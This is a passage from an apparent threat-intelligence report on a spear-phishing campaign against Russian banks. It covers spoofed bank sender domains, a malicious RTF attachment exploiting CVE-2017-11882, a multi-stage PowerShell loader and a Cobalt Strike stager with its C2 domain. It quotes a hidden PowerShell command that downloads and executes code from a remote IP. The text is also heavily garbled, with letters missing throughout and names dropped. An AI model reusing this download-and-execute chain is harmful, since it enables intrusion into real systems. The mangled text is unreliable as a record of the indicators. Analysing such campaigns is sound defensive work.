In\nDecemer the were alread setting up for their next campaign. Toda, on Januar 16th, the first\nwave of spear phishing emails were delivered to the inoxes of Russian anks. adl, this time\naround, the group didn’t forget to CC .\nThe emails were sent in the name of a large uropean ank in an attempt to social engineer the\nreceiver into trusting the email. The emails were quite plain with onl a single question in the od\nand an attachment with the name once.rtf . In other cases, we saw a file with the name\nЗаявление .rtf attached to an email that was also written in Russian:\nFig-1 xample of spear phishing email\nThe emails were sent from addresses on the domains ankosantantder.com  and illing-cr.ru , which\nwere oth set up for this campaign specificall.\nAnalsis\nThe attachment auses CV-2017-11882 to start Powerhell with the following command:\npowershell -nop -w hidden -c “IX ((new-oject\nnet.weclient).downloadstring(‘http://46.21.147.61:80/a’))”\nThis command downloads and executes a second stage, which is also a Powerhell script, ut\nencoded:\nFig-2 econd stage\nThis script decodes to the third stage of the attack, another Powerhell script. This stage-three script\nis used to load a small piece of emedded shellcode into memor and run it like so:\nFig-3 tage-three script\nThe shellcode starts the Coalt trike stager in a new threat and starts it up. This stager will initiate\nconnectivit with the C2 server to install the Coalt trike implant.\nInfrastructure\nAs shown, the stager eacons out to helpdesk-oracle.com , which was registered  a person using\nthe email address krstianwalczak@andex.com .
